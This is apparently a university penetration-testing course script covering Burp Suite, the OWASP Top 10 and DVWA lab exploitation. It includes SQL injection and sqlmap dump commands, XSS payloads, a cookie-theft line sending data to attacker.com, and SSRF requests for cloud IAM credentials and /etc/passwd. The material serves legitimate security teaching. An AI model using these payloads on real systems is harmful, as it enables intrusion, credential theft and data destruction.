# Video Script: Module 09 — Web Application Penetration Testing

## Course: CIS-4333 Penetration Testing

## Texas Wesleyan University | Professor Nash

## Estimated Duration: 20–24 minutes

## Certification Alignment: CompTIA PenTest+ (PT0-002)

---

### SLIDE 1 — Introduction (0:00–1:00)

Welcome to Module 09: Web Application Penetration Testing. I am Professor Nash.

Web applications are the attack surface that most organizations expose directly to the internet. Banking apps, healthcare portals, e-commerce platforms, enterprise HR systems — they all have one thing in common: they accept input from untrusted users and process it in potentially dangerous ways.

This module covers Burp Suite as our primary web testing platform, the OWASP Top 10 vulnerability categories, and hands-on exploitation of SQL injection, cross-site scripting, insecure direct object references, server-side request forgery, authentication bypass, and API testing.

Authorization reminder: web application testing generates significant traffic and can cause real harm — corrupting data, crashing services, or exposing other users' data. All testing in this module occurs only against DVWA and other pre-authorized vulnerable applications in isolated lab environments.

---

### SLIDE 2 — Web Application Testing Context (1:00–2:30)

Web applications are the primary attack vector in most modern breaches. OWASP — the Open Worldwide Application Security Project — maintains the OWASP Top 10, the industry-standard list of the most critical web application security risks.

For the PenTest+ exam, web application testing falls within Domain 3: Attacks and Exploits. You need to know the OWASP Top 10, the specific vulnerabilities within each category, and the tools used to test them.

The web application testing lifecycle:

1. Reconnaissance — map the application's structure, technology stack, and entry points
2. Automated scanning — identify low-hanging fruit
3. Manual testing — probe business logic, test each input systematically
4. Exploitation — demonstrate impact of confirmed vulnerabilities
5. Documentation — capture evidence for each finding

---

### SLIDE 3 — Burp Suite Overview (2:30–4:30)

Burp Suite is the industry-standard web application testing platform. Built by PortSwigger, it intercepts and manipulates all HTTP/HTTPS traffic between your browser and the target application.

**Burp Suite components:**

| Component | Purpose |
|-----------|---------|
| Proxy | Intercepts and modifies HTTP/HTTPS traffic |
| Repeater | Resend individual requests with modifications |
| Intruder | Automated fuzzing and brute force |
| Scanner | Automated vulnerability detection (Pro only) |
| Decoder | Encode/decode Base64, URL, HTML, etc. |
| Comparer | Diff two requests or responses |
| Target | Site map, scope management |
| Logger | Request/response history |
| Sequencer | Token randomness analysis |

**Setting up Burp Suite:**

1. Launch Burp Suite Community Edition
2. Navigate to Proxy > Options — confirm listener is on `127.0.0.1:8080`
3. Configure your browser to use proxy `127.0.0.1:8080`
4. Install the Burp Suite CA certificate in your browser for HTTPS interception
5. Toggle Intercept to "On" and browse the target application

---

### SLIDE 4 — Burp Suite Proxy and Repeater (4:30–6:00)

The Proxy is Burp's foundation. Every HTTP request your browser makes passes through Burp first.

With Intercept on, each request pauses in Burp for your review before it is forwarded. You can read, modify, and drop requests:

```text
GET /profile?id=12345 HTTP/1.1
Host: dvwa.local
Cookie: PHPSESSID=abc123; security=low
```

Right-click any request in Proxy to send it to Repeater. Repeater allows you to modify and resend a single request as many times as you want:

- Change the `id` parameter to `id=12346` and resend — is a different user's profile returned?
- Add single quotes to inputs — does the application return a SQL error?
- Modify authentication headers — does removing the cookie still grant access?

Repeater is your primary manual testing tool. The Proxy history tab shows every request made during your testing session — invaluable for review and evidence collection.

---

### SLIDE 5 — Burp Suite Intruder (6:00–7:30)

Intruder automates iterative attacks. It takes a request template, marks one or more positions as injection points, and iterates through a payload list.

Attack types:

| Type | Behavior | Use Case |
|------|----------|---------|
| Sniper | One payload list, one position at a time | Single-parameter fuzzing |
| Battering Ram | Same payload in all positions simultaneously | Same value across parameters |
| Pitchfork | Multiple lists, paired by index | Username + password pairs |
| Cluster Bomb | Cartesian product of all lists | Full credential brute force |

Example — testing a login form:

1. Capture the login POST request in Proxy
2. Send to Intruder
3. Mark `username` and `password` as positions
4. Set attack type to Pitchfork
5. Load username and password wordlists
6. Start attack and sort results by response length or status code

In Burp Community Edition, Intruder is rate-limited. Burp Pro removes this limitation.

---

### SLIDE 6 — SQL Injection (7:30–9:30)

SQL injection (SQLi) occurs when user-supplied input is incorporated into a database query without proper sanitization. The attacker can manipulate the query logic to extract data, bypass authentication, or execute operating system commands.

### Testing for SQLi

```text
# In a URL parameter or form field, inject:
'
''
1' OR '1'='1
1' OR '1'='1'--
1; DROP TABLE users--
```

A SQL error message like `You have an error in your SQL syntax` confirms the input is being interpreted as SQL.

### DVWA SQLi Example

In DVWA (security level: low), the user ID parameter is vulnerable:

```text
# In the User ID field, enter:
1' OR '1'='1

# The resulting query becomes:
SELECT * FROM users WHERE user_id = '1' OR '1'='1'
# This returns all user records because '1'='1' is always true
```

### Union-Based SQLi

```text
# Determine number of columns
1' ORDER BY 1--
1' ORDER BY 2--
1' ORDER BY 3--   (error = 3 columns exist, go back to 2)

# Extract data using UNION
1' UNION SELECT null, database()--
1' UNION SELECT null, table_name FROM information_schema.tables--
1' UNION SELECT null, username FROM users--
```

### sqlmap for Automated SQLi

```bash
# Basic scan
sqlmap -u "http://dvwa.local/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=abc123;security=low"

# Extract databases
sqlmap -u "URL" --dbs

# Extract tables from a database
sqlmap -u "URL" -D dvwa --tables

# Dump a table
sqlmap -u "URL" -D dvwa -T users --dump
```

---

### SLIDE 7 — Cross-Site Scripting (9:30–11:00)

Cross-site scripting (XSS) occurs when an application includes unvalidated, unencoded user input in its HTML output, allowing attackers to inject JavaScript that executes in other users' browsers.

### XSS Types

| Type | Persistence | How It Works |
|------|-------------|-------------|
| Reflected | None | Payload in URL/request, reflected in immediate response |
| Stored | Persistent | Payload stored in database, served to all subsequent visitors |
| DOM-based | None | JavaScript modifies the DOM using attacker-controlled input |

### Testing for XSS

```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
javascript:alert('XSS')
```

In Burp Repeater, inject these payloads into form fields, URL parameters, HTTP headers (User-Agent, Referer), and cookie values.

### Stored XSS Impact

Stored XSS is the most dangerous type. If a payload is stored and served to administrators, it can:

- Steal session cookies: `<script>document.location='http://attacker.com/steal?c='+document.cookie</script>`
- Capture keystrokes
- Redirect users to phishing pages
- Perform actions on behalf of the victim user (CSRF-like impact)

---

### SLIDE 8 — Insecure Direct Object References (11:00–12:30)

IDOR (Insecure Direct Object Reference) occurs when an application uses user-controllable input to directly reference internal objects — database records, files, accounts — without verifying that the requesting user is authorized to access them.

### IDOR Example

A banking application shows account details at:

```text
GET /api/account/details?account_id=10045
```

Simply changing `10045` to `10046`, `10047`, etc. returns other users' account information because the application checks only that the user is authenticated — not that the account belongs to them.

Testing IDOR:

1. Log in as user A, navigate to the user's profile, order, or account page
2. Note the identifier in the URL or request body
3. Change the identifier to a neighboring value
4. If different user data is returned, IDOR is confirmed
5. In Burp Repeater, iterate through values systematically

IDOR falls under OWASP A01:2021 — Broken Access Control.

---

### SLIDE 9 — Server-Side Request Forgery (12:30–14:00)

SSRF (Server-Side Request Forgery) occurs when an attacker can make the server issue HTTP requests to arbitrary destinations. The server's requests can reach internal services that the attacker cannot reach directly.

### Testing for SSRF

Look for parameters that accept URLs or IP addresses:

```text
https://app.example.com/fetch?url=http://internal-server/admin
https://app.example.com/preview?link=file:///etc/passwd
```

Common SSRF targets:

- Internal cloud metadata services: `http://169.254.169.254/latest/meta-data/` (AWS IMDSv1)
- Internal web services and admin panels
- Internal databases (Redis, MongoDB with default auth)
- File system via `file://` protocol

```bash
# AWS EC2 metadata via SSRF
curl "https://vulnerable-app/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

SSRF against cloud metadata services can expose IAM credentials, potentially giving the attacker full control of the cloud environment.

---

### SLIDE 10 — Authentication Bypass (14:00–15:30)

Authentication bypass vulnerabilities allow attackers to authenticate without valid credentials or to access authenticated content without authentication.

### Common Bypass Techniques

**SQL injection in login forms:**

```text
Username: admin'--
Password: anything

# Results in query:
SELECT * FROM users WHERE username = 'admin'--' AND password = 'anything'
# The -- comments out the password check
```

**Default credentials:**

Many applications ship with default admin credentials. Always test: `admin/admin`, `admin/password`, `admin/1234`, `root/root`, `administrator/administrator`.

**JWT manipulation:**

```text
# Decode a JWT (three base64-encoded parts: header.payload.signature)
# Modify the payload (e.g., change "role":"user" to "role":"admin")
# If the server does not validate the signature, the modified token works

# The "none" algorithm attack: set alg to "none", remove the signature
```

**Broken session management:**

- Predictable session tokens (sequential numbers, timestamps)
- Tokens not invalidated after logout
- Long-lived tokens without rotation

---

### SLIDE 11 — API Testing (15:30–17:30)

Modern web applications rely heavily on APIs. APIs often have different (weaker) security controls than the browser-facing UI.

### API Discovery

```bash
# Enumerate API endpoints
dirb https://api.example.com /usr/share/wordlists/dirb/common.txt
ffuf -u https://api.example.com/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/api-endpoints.txt

# Look for API documentation
https://api.example.com/swagger
https://api.example.com/api-docs
https://api.example.com/openapi.json
```

### API Testing with Burp Suite

1. Configure browser proxy through Burp
2. Use the mobile/web application normally
3. Review all API calls in Proxy history
4. Test each endpoint in Repeater:
   - Change HTTP method (GET to POST to PUT to DELETE)
   - Remove authentication headers
   - Modify object IDs in the path or body
   - Inject SQL and XSS payloads in JSON values
   - Test for mass assignment — add unexpected properties to JSON bodies

### Common API Vulnerabilities

- **Broken Object Level Authorization (BOLA)** — same as IDOR for API resources
- **Broken Function Level Authorization** — admin endpoints accessible to regular users
- **Excessive Data Exposure** — API returns more fields than the client displays
- **Mass Assignment** — API accepts and applies properties that should not be user-controlled
- **Security Misconfiguration** — CORS misconfiguration, verbose error messages

---

### SLIDE 12 — OWASP Top 10 Quick Reference (17:30–19:00)

The OWASP Top 10 (2021) is the most referenced web application security framework. For PenTest+, know each category:

| # | Category | Key Example |
|---|----------|------------|
| A01 | Broken Access Control | IDOR, privilege escalation |
| A02 | Cryptographic Failures | Cleartext transmission, weak algorithms |
| A03 | Injection | SQL injection, command injection |
| A04 | Insecure Design | Missing security controls by design |
| A05 | Security Misconfiguration | Default credentials, verbose errors |
| A06 | Vulnerable Components | Outdated libraries with CVEs |
| A07 | Auth and Session Failures | Weak passwords, insecure session tokens |
| A08 | Software/Data Integrity Failures | Insecure deserialization, supply chain |
| A09 | Logging/Monitoring Failures | Missing audit logs |
| A10 | SSRF | Server-side request forgery |

---

### SLIDE 13 — PenTest+ Exam Alignment (19:00–20:30)

For PT0-002, focus on these areas from Module 09:

Know the OWASP Top 10 categories and a representative vulnerability for each. The exam tests category identification given a vulnerability description.

Burp Suite components tested: Proxy (intercept), Repeater (manual testing), Intruder (automated fuzzing), Decoder (encoding/decoding). Know what each does.

SQLi types: classic, union-based, blind, time-based blind. Know the difference between in-band and out-of-band SQLi.

XSS types: reflected, stored, DOM-based. Know that stored XSS has the highest impact due to persistence.

IDOR testing: change object identifiers in requests and observe responses.

SSRF: the server makes requests on the attacker's behalf; cloud metadata is a high-value SSRF target.

Authentication bypass: SQLi in login, default credentials, JWT none algorithm attack.

---

### SLIDE 14 — Closing and Lab Preview (20:30–21:30)

Module 09 covered the most prevalent attack surface in modern organizations: web applications. Key takeaways:

- Burp Suite intercepts all traffic — Proxy, Repeater, and Intruder are your primary tools
- SQLi manipulates database queries through unvalidated input
- XSS injects JavaScript that runs in other users' browsers — stored XSS has the highest impact
- IDOR tests whether authorization is checked properly for object access
- SSRF forces the server to make requests to internal or external services
- APIs are a high-value, often under-secured attack surface
- OWASP Top 10 is the exam's primary web vulnerability framework

In the lab, you will use Burp Suite with DVWA to exploit SQLi and XSS at multiple security levels, and test for IDOR. See you there.

---

### End of Module 09 Video Script

**Proprietary and Confidential. Not for disclosure outside of Texas Wesleyan University course use.**
